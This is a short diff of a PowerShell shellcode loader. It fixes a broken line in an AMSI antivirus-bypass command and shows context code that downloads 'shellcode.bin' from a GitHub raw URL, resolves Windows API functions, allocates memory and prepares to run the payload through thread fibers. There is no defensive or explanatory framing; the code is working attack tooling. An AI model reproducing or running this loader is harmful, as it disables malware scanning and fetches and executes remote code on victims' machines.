@@ -1,4 +1,4 @@
-Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
 $url = "https://github.com/MJ06-BP/bp/raw/refs/heads/main/shellcode.bin"
 
@@ -39,6 +39,7 @@ foreach ($kv in $delegateTypes.GetEnumerator()) {
     $delegate = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, $kv.Value)
     $funcs[$kv.Key] = $delegate
 }
+
 $MEM_COMMIT             = 0x1000
 $MEM_RESERVE            = 0x2000
 $PAGE_READWRITE         = 0x04
@@ -56,6 +57,7 @@ if (-not $success) {
     $funcs.VirtualFree.Invoke($mem, 0, $MEM_RELEASE)
     exit
 }
+
 $mainFiber = $funcs.ConvertThreadToFiber.Invoke([IntPtr]::Zero)
 if ($mainFiber -eq [IntPtr]::Zero) {
     $funcs.VirtualFree.Invoke($mem, 0, $MEM_RELEASE)
